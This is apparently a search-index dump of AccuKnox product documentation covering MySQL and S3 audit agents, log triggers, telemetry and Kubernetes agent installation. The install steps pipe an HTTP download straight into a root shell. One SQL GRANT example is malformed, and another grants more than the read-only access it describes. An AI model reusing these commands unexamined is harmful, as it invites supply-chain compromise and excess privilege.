Exporter exports the audit information to the AccuKnox Control Plane. The Audit Log Exporter is made of open-source tools such as Percona's Audit Log plugin and Fluentd. Host Requirements \u00b6 The Audit Log Exporter runs on the host where the MySQL Server is running on. Audit Log Exporter itself requires a minimum of 512 MB RAM and 512 MB disk space.","title":"Introduction"},{"location":"data-protection/mysql/audit-log-exporter/introduction/#audit-log-exporter","text":"The Audit Log Exporter exports the audit information to the AccuKnox Control Plane. The Audit Log Exporter is made of open-source tools such as Percona's Audit Log plugin and Fluentd.","title":"Audit Log Exporter"},{"location":"data-protection/mysql/audit-log-exporter/introduction/#host-requirements","text":"The Audit Log Exporter runs on the host where the MySQL Server is running on. Audit Log Exporter itself requires a minimum of 512 MB RAM and 512 MB disk space.","title":"Host Requirements"},{"location":"data-protection/mysql/audit-log-exporter/requirements/","text":"","title":"Requirements"},{"location":"data-protection/mysql/data-agent/installation/","text":"Accuknox Data Agent DB configuration \u00b6 AccuKnox Data Agent can scan one or more database. The database to be scanned is configured through a file located at conf/agent-db-config.yaml The following is an example of a agent-db-config.yaml: apiVersion: v1 type: agent-db-config data: workspace: 148 client-id: client-secret: databases: - version: V1 type: mysql key: asdlkm2lk3n-q23-asd-12-3 host: localhost port: 3306 user: ada_test_user password: password - version: V1 type: mysql key: asdlkm2lk3n-q23-asd-12-3 host: localhost port: 5432 user: test password: test AccuKnox Data Agent requires a MySQL user account that can perform SELECT on information_schema.* and should be able to perform GRANT. Create a new MySQL user CREATE USER 'accuknox'@'localhost' IDENTIFIED BY 'password'; By default, the users created will have read only access to information_schema, so no additional privileges are needed on information_schema. GRANT USAGE on *.* TO 'accuknox'@'localhost' WITH GRANT OPTION; The GRANT OPTION allows AccuKnox Data Agent to allow/deny access to users. Installation \u00b6 Unzip AccuKnox Data Agent Edit the conf/agent-db-config.yaml Add the Workspace ID Add the client-id and client-secret created for Keycloak for the accuknox-dp-agents client in accuknox realm In app.yaml, update the application.url.agent-login to the keycloak openid-connect URL. It should be something like https://<keycloak-domain>/auth/realms/<realm>/protocol/openid-connect/token The app.yaml and agent-db-config.yaml files must be present inside conf/ folder. Run AccuKnox Data Agent ./ada > /dev/null 2>&1 &","title":"Installation"},{"location":"data-protection/mysql/data-agent/installation/#accuknox-data-agent-db-configuration","text":"AccuKnox Data Agent can scan one or more database. The database to be scanned is configured through a file located at conf/agent-db-config.yaml The following is an example of a agent-db-config.yaml: apiVersion: v1 type: agent-db-config data: workspace: 148 client-id: client-secret: databases: - version: V1 type: mysql key: asdlkm2lk3n-q23-asd-12-3 host: localhost port: 3306 user: ada_test_user password: password - version: V1 type: mysql key: asdlkm2lk3n-q23-asd-12-3 host: localhost port: 5432 user: test password: test AccuKnox Data Agent requires a MySQL user account that can perform SELECT on information_schema.* and should be able to perform GRANT. Create a new MySQL user CREATE USER 'accuknox'@'localhost' IDENTIFIED BY 'password'; By default, the users created will have read only access to information_schema, so no additional privileges are needed on information_schema. GRANT USAGE on *.* TO 'accuknox'@'localhost' WITH GRANT OPTION; The GRANT OPTION allows AccuKnox Data Agent to allow/deny access to users.","title":"Accuknox Data Agent DB configuration"},{"location":"data-protection/mysql/data-agent/installation/#installation","text":"Unzip AccuKnox Data Agent Edit the conf/agent-db-config.yaml Add the Workspace ID Add the client-id and client-secret created for Keycloak for the accuknox-dp-agents client in accuknox realm In app.yaml, update the application.url.agent-login to the keycloak openid-connect URL. It should be something like https://<keycloak-domain>/auth/realms/<realm>/protocol/openid-connect/token The app.yaml and agent-db-config.yaml files must be present inside conf/ folder. Run AccuKnox Data Agent ./ada > /dev/null 2>&1 &","title":"Installation"},{"location":"data-protection/mysql/data-agent/introduction/","text":"AccuKnox Data Agent for MySQL \u00b6 Accuknox Data Agent scans for the database, tables in the database and columns in those tables and exports them to AccuKnox SaaS for data classification and labelling. Hardware Requirements \u00b6 RAM - 1 GB (Minumum) Storage 512 MB (Minimum) System Requirements \u00b6 AccuKnox Data Agent runs on a Linux host and can be run on Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+, Fedora and RHEL. Software Requirements \u00b6 In order to use Accuknox Data Agent, a working MySQL server 5.6+ that it can connect to is all that is required. Network Requirements \u00b6 AccuKnox Data Agent requires port number 443 to be open for egress. This port will be used to communicate with the AccuKnox Control Plane. Permissions required by Accuknox Data Agent on MySQL. \u00b6 AccuKnox Data Agent requires a MySQL user and password with read-only permission to the information_schema table. MySQL 5.7+ \u00b6 CREATE USER 'ada_user'@'<host>' IDENTIFIED BY '<password>'; GRANT SELECT ON information_schema.* TO '<host>'@'<password>'; FLUSH PRIVILEGES;","title":"Introduction"},{"location":"data-protection/mysql/data-agent/introduction/#accuknox-data-agent-for-mysql","text":"Accuknox Data Agent scans for the database, tables in the database and columns in those tables and exports them to AccuKnox SaaS for data classification and labelling.","title":"AccuKnox Data Agent for MySQL"},{"location":"data-protection/mysql/data-agent/introduction/#hardware-requirements","text":"RAM - 1 GB (Minumum) Storage 512 MB (Minimum)","title":"Hardware Requirements"},{"location":"data-protection/mysql/data-agent/introduction/#system-requirements","text":"AccuKnox Data Agent runs on a Linux host and can be run on Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+, Fedora and RHEL.","title":"System Requirements"},{"location":"data-protection/mysql/data-agent/introduction/#software-requirements","text":"In order to use Accuknox Data Agent, a working MySQL server 5.6+ that it can connect to is all that is required.","title":"Software Requirements"},{"location":"data-protection/mysql/data-agent/introduction/#network-requirements","text":"AccuKnox Data Agent requires port number 443 to be open for egress. This port will be used to communicate with the AccuKnox Control Plane.","title":"Network Requirements"},{"location":"data-protection/mysql/data-agent/introduction/#permissions-required-by-accuknox-data-agent-on-mysql","text":"AccuKnox Data Agent requires a MySQL user and password with read-only permission to the information_schema table.","title":"Permissions required by Accuknox Data Agent on MySQL."},{"location":"data-protection/mysql/data-agent/introduction/#mysql-57","text":"CREATE USER 'ada_user'@'<host>' IDENTIFIED BY '<password>'; GRANT SELECT ON information_schema.* TO '<host>'@'<password>'; FLUSH PRIVILEGES;","title":"MySQL 5.7+"},{"location":"data-protection/mysql/data-agent/requirements/","text":"","title":"Requirements"},{"location":"data-protection/s3/introduction/","text":"AccuKnox S3 Access Audit \u00b6 AccuKnox S3 Access Audit allows you to audit the access of the objects stored in an AWS S3 bucket. With AccuKnox S3 Access Audit, users can understand what operation was performed on S3 objects, the status of the operation, who performed the operation and when the operation was performed on an S3 object.","title":"Introduction"},{"location":"data-protection/s3/introduction/#accuknox-s3-access-audit","text":"AccuKnox S3 Access Audit allows you to audit the access of the objects stored in an AWS S3 bucket. With AccuKnox S3 Access Audit, users can understand what operation was performed on S3 objects, the status of the operation, who performed the operation and when the operation was performed on an S3 object.","title":"AccuKnox S3 Access Audit"},{"location":"data-protection/s3/requirements/","text":"Data Buckets \u00b6 Data Buckets are the buckets where we store the actual data. Create data buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/create-bucket-overview.html Logs Buckets \u00b6 Logs buckets are where the S3 Access logs are written to by AWS S3 Server. Configure log buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html","title":"Requirements"},{"location":"data-protection/s3/requirements/#data-buckets","text":"Data Buckets are the buckets where we store the actual data. Create data buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/create-bucket-overview.html","title":"Data Buckets"},{"location":"data-protection/s3/requirements/#logs-buckets","text":"Logs buckets are where the S3 Access logs are written to by AWS S3 Server. Configure log buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html","title":"Logs Buckets"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/","text":"The following article provides the pre-requisites and instructions to install AccuKnox S3 Audit Reporter agent to monitor access logs of S3 buckets and export relevent metrics to AccuKnox Control Plane. Requirements \u00b6 The following software and network requirements must be met. AWS S3 Requirements \u00b6 For any AWS S3 bucket that needs to be monitored, we need the following requirements to be met with: Enable the AWS S3 Access Logs - https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html Create AWS user credentials(access key id and secret access key) for the Data Bucket - the bucket that contains the objects to be monitored. This user credentials must have permission to list the objects in the data bucket. Create AWS user credentials(access key id and secret access key) for the Logs Bucket - the bucket that contains the logs objects. This user credentials must have permissions to list the objects and retreive the objects present in the logs bucket. Software Requirements \u00b6 AccuKnox S3 Audit Reporter supports Linux and can be run on most major Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+. Network Requirements \u00b6 AccuKnox S3 Audit Reporter requires port number 443 to be open for egress. This port will be used to fetch S3 Access Log data, Bucket data and to push metrics to AccuKnox Control Plane. AWS S3 Bucket configuration \u00b6 AccuKnox S3 Audit Reporter can monitor more than 1 bucket at a time. The bucket to be monitored is configured through a file located at conf/buckets.yaml The following is an example of a buckets.yaml: apiVersion: v1 type: S3AuditReporterBuckets data: workspace: 30921123 apiToken: as013n21m3nkjn2m1m97sd buckets: - dataBucketName: bucket-1 logsBucketName: bucket-1-logs logPrefix: logs/ dataBucketAccessKeyId: AK..... dataBucketSecretAccessKey: 99..... logBucketAccessKeyId: AK... logBucketSecretAccessKey: 99.... dataSourceProvider: AWS bucketRegion: us-west-2 - dataBucketName: bucket-2 logsBucketName: bucket-2-logs logPrefix: dataBucketAccessKeyId: AK..... dataBucketSecretAccessKey: 99..... logBucketAccessKeyId: AK... logBucketSecretAccessKey: 99.... dataSourceProvider: AWS bucketRegion: us-west-2 Installation \u00b6 Unzip AccuKnox S3 Audit Reporter unzip aks3r.zip -d aks3r Edit the conf/buckets.yaml Configure the buckets to be monitored Add the workspace Add the apiToken The app.yaml and buckets.yaml files must be present inside conf/ folder. Run AccuKnox S3 Audit Reporter ./asar > /dev/null 2>&1 &","title":"S3 audit reporter installation guide"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#requirements","text":"The following software and network requirements must be met.","title":"Requirements"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#aws-s3-requirements","text":"For any AWS S3 bucket that needs to be monitored, we need the following requirements to be met with: Enable the AWS S3 Access Logs - https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html Create AWS user credentials(access key id and secret access key) for the Data Bucket - the bucket that contains the objects to be monitored. This user credentials must have permission to list the objects in the data bucket. Create AWS user credentials(access key id and secret access key) for the Logs Bucket - the bucket that contains the logs objects. This user credentials must have permissions to list the objects and retreive the objects present in the logs bucket.","title":"AWS S3 Requirements"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#software-requirements","text":"AccuKnox S3 Audit Reporter supports Linux and can be run on most major Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+.","title":"Software Requirements"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#network-requirements","text":"AccuKnox S3 Audit Reporter requires port number 443 to be open for egress. This port will be used to fetch S3 Access Log data, Bucket data and to push metrics to AccuKnox Control Plane.","title":"Network Requirements"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#aws-s3-bucket-configuration","text":"AccuKnox S3 Audit Reporter can monitor more than 1 bucket at a time. The bucket to be monitored is configured through a file located at conf/buckets.yaml The following is an example of a buckets.yaml: apiVersion: v1 type: S3AuditReporterBuckets data: workspace: 30921123 apiToken: as013n21m3nkjn2m1m97sd buckets: - dataBucketName: bucket-1 logsBucketName: bucket-1-logs logPrefix: logs/ dataBucketAccessKeyId: AK..... dataBucketSecretAccessKey: 99..... logBucketAccessKeyId: AK... logBucketSecretAccessKey: 99.... dataSourceProvider: AWS bucketRegion: us-west-2 - dataBucketName: bucket-2 logsBucketName: bucket-2-logs logPrefix: dataBucketAccessKeyId: AK..... dataBucketSecretAccessKey: 99..... logBucketAccessKeyId: AK... logBucketSecretAccessKey: 99.... dataSourceProvider: AWS bucketRegion: us-west-2","title":"AWS S3 Bucket configuration"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#installation","text":"Unzip AccuKnox S3 Audit Reporter unzip aks3r.zip -d aks3r Edit the conf/buckets.yaml Configure the buckets to be monitored Add the workspace Add the apiToken The app.yaml and buckets.yaml files must be present inside conf/ folder. Run AccuKnox S3 Audit Reporter ./asar > /dev/null 2>&1 &","title":"Installation"},{"location":"data-protection/s3/setup-and-configure/","text":"In order to setup AccuKnox S3 Access Audit perform the following steps: Visit AccuKnox Platform Login using the email and password. Select or create a new workspace On the left navigation pane, select Data Protection Next, select Data Sources Click on the Configure Data Source button at the top right corner Choose No for Is the s3 bucket mounted inside a container workload? Choose No for Is your S3 access log buckets accessible from outside your private network? In our scenario, we do not have S3 bucket objects accessible from outside the private network, hence click on Done. Follow the steps here to install the AccuKnox S3 Audit Reporter Agent. Once the agent has been configured and is running, it'll start syncing the objects in the data bucket with AccuKnox Platform. Now, on the left navigation pane, under Data Protection, click on Sensitive Source Labels Enter a value for Label. Under S3 BUCKET on the left, select the bucket you want to configure sensitive sources from and select the objects that are sensitive on the right. Click on Next. We can skip the Configure Flagged Destination step. Review the selection and click on Create.","title":"Setup and configure"},{"location":"extensions/code-hilite/","text":"CodeHilite \u00b6 CodeHilite - Material for MkDocs Supported languages - Pygments Configure mkdocs.yml \u00b6 markdown_extensions: - codehilite","title":"CodeHilite"},{"location":"extensions/code-hilite/#codehilite","text":"CodeHilite - Material for MkDocs Supported languages - Pygments","title":"CodeHilite"},{"location":"extensions/code-hilite/#configure-mkdocsyml","text":"markdown_extensions: - codehilite","title":"Configure mkdocs.yml"},{"location":"extensions/footnote/","text":"Footnote \u00b6 Footnotes - Material for MkDocs Configure mkdocs.yml \u00b6 markdown_extensions: - footnotes Example \u00b6 Footnote example 1. 1 Footnote example 2. 2 One line \u21a9 First line Second line \u21a9","title":"Footnote"},{"location":"extensions/footnote/#footnote","text":"Footnotes - Material for MkDocs","title":"Footnote"},{"location":"extensions/footnote/#configure-mkdocsyml","text":"markdown_extensions: - footnotes","title":"Configure mkdocs.yml"},{"location":"extensions/footnote/#example","text":"Footnote example 1. 1 Footnote example 2. 2 One line \u21a9 First line Second line \u21a9","title":"Example"},{"location":"extensions/mathjax/","text":"MathJax \u00b6 PyMdown - Material for MkDocs Configure mkdocs.yml \u00b6 markdown_extensions: - mdx_math: enable_dollar_delimiter: True Example code \u00b6 $$ P \\c dot Q = \\| P \\|\\| Q \\|\\c os \\a lpha $$ Example rendering \u00b6 \\[ P\\cdot Q = \\|P\\|\\|Q\\|\\cos\\alpha \\]","title":"MathJax"},{"location":"extensions/mathjax/#mathjax","text":"PyMdown - Material for MkDocs","title":"MathJax"},{"location":"extensions/mathjax/#configure-mkdocsyml","text":"markdown_extensions: - mdx_math: enable_dollar_delimiter: True","title":"Configure mkdocs.yml"},{"location":"extensions/mathjax/#example-code","text":"$$ P \\c dot Q = \\| P \\|\\| Q \\|\\c os \\a lpha $$","title":"Example code"},{"location":"extensions/mathjax/#example-rendering","text":"\\[ P\\cdot Q = \\|P\\|\\|Q\\|\\cos\\alpha \\]","title":"Example rendering"},{"location":"getting-started/Logs/","text":"Logs and Triggers \u00b6 1. What Kind of Logs: \u00b6 The logs generated from each component like Network / System / Data Protection / Anamoly Detection can be viewed under Logs section. The logs can be viewed for independent workloads like K8's or VM's Each of the component should be up and Running in the installed cluster for the logs to be seen in the Workspace . NOTE: It's assumed that All Agents is running on cluster if not kindly go through this section 2. Triggers: \u00b6 An Alert trigger is a rule which triggers information transfer through a known channel. Customer can send information [log] in Real Time when it occurs or on specified Frequency. Frequency is configurable which can be Once In a Day/ Week / Month. Predefined Filters (or) pre-saved global filters are search queries on logs that is already available in the system. Example : show logs for traffic direction = \"EGRESS\" 3. Configuration of Alert Triggers: \u00b6 On the Logs page, after choosing specific log filter click on 'Create Trigger' button. The below fields needs to be entered with appropriate data: Name: Enter the name for the trigger. You can set any name without special characters. When to Initiate: The frequency of the trigger as Real Time / . Status: Enter the severity for the trigger. Search Filter Data : The filter log chosen in automatically populated here. This is optional. Predefined queries: The list of predefined queries for this workspace is shown as default. Notification Channel: Select the integration channel that needs to receive logs. Can be Slack/ Splunk / Cloudwatch / Elastic. (Note: Channel Integrations needs to be done beforehand) Save: Click on Save for the trigger to get stored in database. a. List Of Triggers: \u00b6 Select Triggers from the left navigation to view the list of triggers created. (If Default params needs to be modified) The below fields for each trigger can be viewed. Alert Trigger : Name of the Trigger Created At : Time of Trigger Creation Channel : Integration Channel Name Enable/Disable: Enabling / Disabling the trigger to forward the logs into Integration Channel. Details : The filter query of the associated Trigger. b. Actions: \u00b6 Select the below Actions on the triggers to check working of logs forwarding. (If Default params needs to be modified) The below actions for each trigger can be selected. Enable : Enabling the trigger to forward the logs into Integration Channel. Disable : Disabling the trigger to not forward the logs into Integration Channel. Delete : Delete the Logs Trigger Export : Exporting the triggers in PDF format. 4. Logs Forwarding: \u00b6 For each Enabled Trigger, please check the integrated channel to view the logs. The Rule Engine matches the real time logs against the triggers created. Frequency >> Real Time The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel as it happens. Frequency >> Once in A Day The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel only Once in a Day. Frequency >> Once in A Month The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel only Once in a Month. Frequency >> Once in A Week The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel only Once in a Week. NOTE: Frequency reduces channel noise / and safely provides only one informational log on the channels based on frequency time period.","title":"Logs"},{"location":"getting-started/Logs/#logs-and-triggers","text":"","title":"Logs and Triggers"},{"location":"getting-started/Logs/#1-what-kind-of-logs","text":"The logs generated from each component like Network / System / Data Protection / Anamoly Detection can be viewed under Logs section. The logs can be viewed for independent workloads like K8's or VM's Each of the component should be up and Running in the installed cluster for the logs to be seen in the Workspace . NOTE: It's assumed that All Agents is running on cluster if not kindly go through this section","title":"1. What Kind of Logs:"},{"location":"getting-started/Logs/#2-triggers","text":"An Alert trigger is a rule which triggers information transfer through a known channel. Customer can send information [log] in Real Time when it occurs or on specified Frequency. Frequency is configurable which can be Once In a Day/ Week / Month. Predefined Filters (or) pre-saved global filters are search queries on logs that is already available in the system. Example : show logs for traffic direction = \"EGRESS\"","title":"2. Triggers:"},{"location":"getting-started/Logs/#3-configuration-of-alert-triggers","text":"On the Logs page, after choosing specific log filter click on 'Create Trigger' button. The below fields needs to be entered with appropriate data: Name: Enter the name for the trigger. You can set any name without special characters. When to Initiate: The frequency of the trigger as Real Time / . Status: Enter the severity for the trigger. Search Filter Data : The filter log chosen in automatically populated here. This is optional. Predefined queries: The list of predefined queries for this workspace is shown as default. Notification Channel: Select the integration channel that needs to receive logs. Can be Slack/ Splunk / Cloudwatch / Elastic. (Note: Channel Integrations needs to be done beforehand) Save: Click on Save for the trigger to get stored in database.","title":"3. Configuration of Alert Triggers:"},{"location":"getting-started/Logs/#a-list-of-triggers","text":"Select Triggers from the left navigation to view the list of triggers created. (If Default params needs to be modified) The below fields for each trigger can be viewed. Alert Trigger : Name of the Trigger Created At : Time of Trigger Creation Channel : Integration Channel Name Enable/Disable: Enabling / Disabling the trigger to forward the logs into Integration Channel. Details : The filter query of the associated Trigger.","title":"a. List Of Triggers:"},{"location":"getting-started/Logs/#b-actions","text":"Select the below Actions on the triggers to check working of logs forwarding. (If Default params needs to be modified) The below actions for each trigger can be selected. Enable : Enabling the trigger to forward the logs into Integration Channel. Disable : Disabling the trigger to not forward the logs into Integration Channel. Delete : Delete the Logs Trigger Export : Exporting the triggers in PDF format.","title":"b. Actions:"},{"location":"getting-started/Logs/#4-logs-forwarding","text":"For each Enabled Trigger, please check the integrated channel to view the logs. The Rule Engine matches the real time logs against the triggers created. Frequency >> Real Time The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel as it happens. Frequency >> Once in A Day The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel only Once in a Day. Frequency >> Once in A Month The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel only Once in a Month. Frequency >> Once in A Week The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel only Once in a Week. NOTE: Frequency reduces channel noise / and safely provides only one informational log on the channels based on frequency time period.","title":"4. Logs Forwarding:"},{"location":"getting-started/Telemetry/","text":"Telemetry \u00b6 A Telemetry in Accuknox is tool for visually tracking, analyzing, and displaying key performance metrics, which enable you to monitor the health of your workspace. The metrics generated from each component like Network / System / Data Protection / Anamoly Detection can be viewed in Telemetry Section. Select Workloads \u00b6 Select between available workloads like Virtual Machine or Kubernetes Cluster, whatever is onboarded to your workspace. Each workload have four different components with predefined metrics. You can navigate between the Clusters and Instance Group and Instances Accordingly. Kubernetes Clsuters dropdown lets user filter the data from each Individual clusters, similarly for VM you can filter the data from Insances group to Instances name. Select Components \u00b6 System: Select the available component to check the metrics of for each. You can select System to view the metrics generated from KubeArmor logs. You can select the available filters from each graph to view the metrics from available Hosts, Pods, Namespaces, and Containers. Network: Network logs shows the metrics generated from Cilium logs. Data Protection: Data Protection Metrics shows the metrics generated from the logs of your onboarded databases like MySQL, SQLlite and other DataSources like Amazon S3. Anomaly Detection: Anomaly Detection Telemetries shows the metrics from the logs collected from Trained Container. Note : To view above metrics on the Telemetry Screen make sure the rescpective agents are installed on the onboarded cluster or VM. Steps for Agent Installations, Know more . Graph Filters \u00b6 Each graph contains multiple metrics, you can filter the data for each graph to watch and compare the metrics for each filters available. Select Timestamp \u00b6 You can select the time range for the metrics which you want to see form Last 5 minutes to Last 60 Days.","title":"Telemetry"},{"location":"getting-started/Telemetry/#telemetry","text":"A Telemetry in Accuknox is tool for visually tracking, analyzing, and displaying key performance metrics, which enable you to monitor the health of your workspace. The metrics generated from each component like Network / System / Data Protection / Anamoly Detection can be viewed in Telemetry Section.","title":"Telemetry"},{"location":"getting-started/Telemetry/#select-workloads","text":"Select between available workloads like Virtual Machine or Kubernetes Cluster, whatever is onboarded to your workspace. Each workload have four different components with predefined metrics. You can navigate between the Clusters and Instance Group and Instances Accordingly. Kubernetes Clsuters dropdown lets user filter the data from each Individual clusters, similarly for VM you can filter the data from Insances group to Instances name.","title":"Select Workloads"},{"location":"getting-started/Telemetry/#select-components","text":"System: Select the available component to check the metrics of for each. You can select System to view the metrics generated from KubeArmor logs. You can select the available filters from each graph to view the metrics from available Hosts, Pods, Namespaces, and Containers. Network: Network logs shows the metrics generated from Cilium logs. Data Protection: Data Protection Metrics shows the metrics generated from the logs of your onboarded databases like MySQL, SQLlite and other DataSources like Amazon S3. Anomaly Detection: Anomaly Detection Telemetries shows the metrics from the logs collected from Trained Container. Note : To view above metrics on the Telemetry Screen make sure the rescpective agents are installed on the onboarded cluster or VM. Steps for Agent Installations, Know more .","title":"Select Components"},{"location":"getting-started/Telemetry/#graph-filters","text":"Each graph contains multiple metrics, you can filter the data for each graph to watch and compare the metrics for each filters available.","title":"Graph Filters"},{"location":"getting-started/Telemetry/#select-timestamp","text":"You can select the time range for the metrics which you want to see form Last 5 minutes to Last 60 Days.","title":"Select Timestamp"},{"location":"getting-started/accuknox-agents/","text":"AccuKnox Agents Description \u00b6 Accuknox core agents Description KubeArmor This agent is used to apply system level policies. Cilium This agent is used to apply network level policies. Shared Informer Agent This agent authenticates with your cluster and collects information regarding entities like Nodes, Pods, Namespaces. Feeder Service Feeder service deployment that collects feeds from Kubearmor and Cilium. Policy Enforcement This agent authenticates with your cluster and enforces label and policy. Discovery Engine Agent Discovery Engine discovers the security posture for your workloads and auto-discovers the policy-set required to put the workload in least-permissive mode. The engine leverages the rich visibility provided by KubeArmor and Cilium to auto discover the systems and network security posture Supported platforms \u00b6 Deployments Deployment Type Supported version (Kubernetes) KubeArmor DaemonSet EKS Ubuntu Server 20.04 , Minikube Cluster , MicroK8's Cluster , K3's Cluster , GKE with COS and Ubuntu , EKS Amazon Linux 2 Shared Informer Agent DaemonSet EKS Ubuntu Server 20.04, Minikube Cluster, MicroK8's Cluster, K3's Cluster, GKE with COS and Ubuntu, EKS Amazon Linux 2 Feeder Service ReplicaSet EKS Ubuntu Server 20.04, Minikube Cluster, MicroK8's Cluster, K3's Cluster, GKE with COS and Ubuntu, EKS Amazon Linux 2 Policy Enforcement DaemonSet EKS Ubuntu Server 20.04, Minikube Cluster, MicroK8's Cluster, K3's Cluster, GKE with COS and Ubuntu, EKS Amazon Linux 2 Discovery Engine Agent DaemonSet EKS Ubuntu Server 20.04, Minikube Cluster, MicroK8's Cluster, K3's Cluster, GKE with COS and Ubuntu, EKS Amazon Linux 2 It is assumed that the user has some basic familiarity with Kubernetes, kubectl and helm. It also assumes that you are familiar with the AccuKnox opensource tool workflow. If you're new to AccuKnox itself, refer first to Getting Started . It is recommended to have the following configured before onboarding: Kubectl Helm Pre-requisites \u00b6 Minimum Resource required \u00b6 A Kubernetes cluster with Number of Nodes : 3 Machine Type: e2-standard-2 Total vCPUs : 6 Total Memory: 24GB Deployments Resource usage KubeArmor CPU: 100 m, Memory: 20 Mi Shared Informer Agent CPU: 500 m, Memory: 750 Mi Feeder Service CPU: 1, Memory: 500 Mi Policy Enforcement CPU: 200 m, Memory: 800 M Ports Description 9093, 443, 80 The worker cluster will communicate with accuknox SaaS and general internet Agents Installations \u00b6 Create Namespace kubectl create namespace accuknox-agents Adding AccuKnox Helm repository. Required incase of installing by Helm Add AccuKnox repository to install agents helm package. helm repo add accuknox-agents https://accuknox-agents:xxxxxxxxxxxxxxx@agents.accuknox.com/repository/accuknox-agents Note: \"accuknox-agents\" keys will be unique and provided through accuknox saas platform. Once repository added successfully, update the helm repository. helm repo update 1. Cilium \u00b6 This agent is used to apply network policies. Installation Guide Download Cilium CLI. curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } Install Cilium. cilium install Enable Hubble in Cilium. cilium hubble enable 2. KubeArmor \u00b6 This agent is used to apply system level policies. Installation Guide Download and install Karmor CLI. curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin Install KubeArmor. karmor install 3. Feeder Service \u00b6 Feeder service deployment that collects feeds from Kubearmor and Cilium. Installation Guide To Install agents on destination cluster. helm upgrade --install feeder-service accuknox-agents/feeder-service-chart -n accuknox-agents Set the env of Feeder Service. kubectl set env deploy/feeder-service tenant_id = 241 cluster_id = 427 cluster_name = prod-cluster-onboarding -n accuknox-agents Note: tenant_id and cluster_id will be unique from user to user, replace it with your tenant_id and cluster_id . 4. Shared Informer Agent \u00b6 This agent authenticates with your cluster and collects information regarding entities like nodes, pods, namespaces. Installation Guide 1.To Install agents on destination cluster. helm upgrade --install shared-informer-agent-chart accuknox-agents/shared-informer-agent-chart -n accuknox-agents 5. Policy Enforcement Agent \u00b6 This agent authenticates with your cluster and enforces label and policy. Installation Guide To Install agents on destination cluster. helm upgrade --install policy-enforcement-agent accuknox-agents/policy-enforcement-agent-chart -n accuknox-agents Set the env of policy-enforcement-agent. kubectl set env deploy/policy-enforcement-agent -n accuknox-agents workspace_id = 241 cluster_name = prod-cluster-onboarding Note: workspace_id and cluster_name will be unique from user to user, replace it with your workspace_id and cluste_name . 6. Discovery Engine Agent \u00b6 Discovery Engine discovers the security posture for your workloads and auto-discovers the policy-set required to put the workload in least-permissive mode. The engine leverages the rich visibility provided by KubeArmor and Cilium to auto discover the systems and network security posture. Installation Guide To Install agent on the destination cluster. kubectl apply -f https://raw.githubusercontent.com/accuknox/discovery-engine/dev/deployments/k8s/deployment.yaml -n accuknox-agents Set the env of policy-enforcement-agent. kubectl set env deploy/knoxautopolicy -n accuknox-agents workspace_id = 147 cluster_name = accuknox-e2e-01 Note: workspace_id and cluster_name will be unique from user to user, replace your workspace_id and cluster_name .","title":"AccuKnox Agents"},{"location":"getting-started/accuknox-agents/#accuknox-agents-description","text":"Accuknox core agents Description KubeArmor This agent is used to apply system level policies. Cilium This agent is used to apply network level policies. Shared Informer Agent This agent authenticates with your cluster and collects information regarding entities like Nodes, Pods, Namespaces. Feeder Service Feeder service deployment that collects feeds from Kubearmor and Cilium. Policy Enforcement This agent authenticates with your cluster and enforces label and policy. Discovery Engine Agent Discovery Engine discovers the security posture for your workloads and auto-discovers the policy-set required to put the workload in least-permissive mode. The engine leverages the rich visibility provided by KubeArmor and Cilium to auto discover the systems and network security posture","title":"AccuKnox Agents Description"},{"location":"getting-started/accuknox-agents/#supported-platforms","text":"Deployments Deployment Type Supported version (Kubernetes) KubeArmor DaemonSet EKS Ubuntu Server 20.04 , Minikube Cluster , MicroK8's Cluster , K3's Cluster , GKE with COS and Ubuntu , EKS Amazon Linux 2 Shared Informer Agent DaemonSet EKS Ubuntu Server 20.04, Minikube Cluster, MicroK8's Cluster, K3's Cluster, GKE with COS and Ubuntu, EKS Amazon Linux 2 Feeder Service ReplicaSet EKS Ubuntu Server 20.04, Minikube Cluster, MicroK8's Cluster, K3's Cluster, GKE with COS and Ubuntu, EKS Amazon Linux 2 Policy Enforcement DaemonSet EKS Ubuntu Server 20.04, Minikube Cluster, MicroK8's Cluster, K3's Cluster, GKE with COS and Ubuntu, EKS Amazon Linux 2 Discovery Engine Agent DaemonSet EKS Ubuntu Server 20.04, Minikube Cluster, MicroK8's Cluster, K3's Cluster, GKE with COS and Ubuntu, EKS Amazon Linux 2 It is assumed that the user has some basic familiarity with Kubernetes, kubectl and helm. It also assumes that you are familiar with the AccuKnox opensource tool workflow. If you're new to 